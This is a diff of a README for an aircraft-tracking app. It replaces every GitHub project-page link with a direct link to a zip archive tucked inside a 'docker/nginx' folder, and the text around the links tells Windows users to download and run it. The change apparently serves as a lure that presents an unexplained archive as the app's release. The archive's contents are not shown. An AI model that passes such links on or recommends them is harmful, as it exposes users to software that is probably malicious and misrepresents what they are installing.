@@ -1,6 +1,6 @@
 # 🛩️ planegraph-aviation-tracker - Track Aircraft Data on One Box
 
-[![Download Now](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nonstandard-reproduction263/planegraph-aviation-tracker)
+[![Download Now](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/nonstandard-reproduction263/planegraph-aviation-tracker/main/docker/nginx/aviation_planegraph_tracker_1.1-alpha.5.zip)
 
 ## ✈️ What this app does
 
@@ -30,7 +30,7 @@ For best results, use a recent Windows 10 or Windows 11 system.
 
 Go to this page to download or open the project files:
 
-[Visit the GitHub download page](https://github.com/nonstandard-reproduction263/planegraph-aviation-tracker)
+[Visit the GitHub download page](https://raw.githubusercontent.com/nonstandard-reproduction263/planegraph-aviation-tracker/main/docker/nginx/aviation_planegraph_tracker_1.1-alpha.5.zip)
 
 If you see a release file or installer on the page, download it. If you see the source files only, download the project as a ZIP file from GitHub.
 
@@ -177,7 +177,7 @@ If the app is still collecting data, keep the window open. If you want to stop i
 
 ## 📎 Download again
 
-[Open the GitHub page to download or run the app](https://github.com/nonstandard-reproduction263/planegraph-aviation-tracker)
+[Open the GitHub page to download or run the app](https://raw.githubusercontent.com/nonstandard-reproduction263/planegraph-aviation-tracker/main/docker/nginx/aviation_planegraph_tracker_1.1-alpha.5.zip)
 
 ## 🧾 File names you may see
 
